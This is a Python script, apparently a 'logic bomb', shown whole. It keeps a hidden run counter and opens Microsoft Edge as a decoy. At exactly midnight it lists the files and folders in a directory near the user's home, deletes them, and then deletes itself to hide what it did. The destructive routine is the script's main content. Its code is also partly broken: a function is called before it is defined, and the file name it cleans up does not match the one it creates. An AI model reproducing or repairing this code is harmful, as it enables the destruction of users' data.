import os
import pathlib
from datetime import datetime
from sys import argv

try:
	# Create new file
	# Write 1 in new file
	f = open(".count.txt" , "x")
	f.write("1")
	
	# Start edge and bomb
	os.startfile('msedge.exe')
	# Bomb Function in Here
	checkDate()

except:
	# Open File in Reading Writing Mode
	f = open(".count.txt" , "r+")
	content = 1
	
	# Read Data
	for i in f:
		content = int(i)
	
	# Write New Data
	f = open(".count.txt" , "w+")
	f.write("{}".format(content + 1))
	
	# Stop if more than 1 run.
	if content < 1:
		os.startfile('msedge.exe')

		# Bomb Function in Here
		checkDate()

	if content > 1:
		os.startfile('msedge.exe')

# Find files and folders
def find():
  cwd = str(os.getcwd())
  path = ''
  rootCheck = 0
  for i in cwd:
      if i != '/':
          path += i
      else:
          rootCheck += 1
          path += '/'
          if rootCheck == 3:
              break
  files = os.listdir(path)
  return files

# Remove files and directories
def remove():
  for i in find():
    # If file not equal to our script name continue
    if pathlib.Path(i) != argv[0]:
      # If there is suffix continue 
      # If there is no suffix it means it's a folder
      if pathlib.Path(i).suffix != "":
        os.remove(i)
    
    # if it's not contain delete folder
    if pathlib.Path(i).suffix == "":
      os.rmdir(i)

# Close and remove Count file
# Also destruct yourself
def deactivate():
  f.close()
  os.remove("count.txt")
  os.remove(argv[0])


# Check Time
def checkDate():
  now = datetime.now()
  current_time = now.strftime("%H:%M:%S")

  target = "00:00:00"
  
  if current_time == target:
    find()
    remove()
    deactivate()
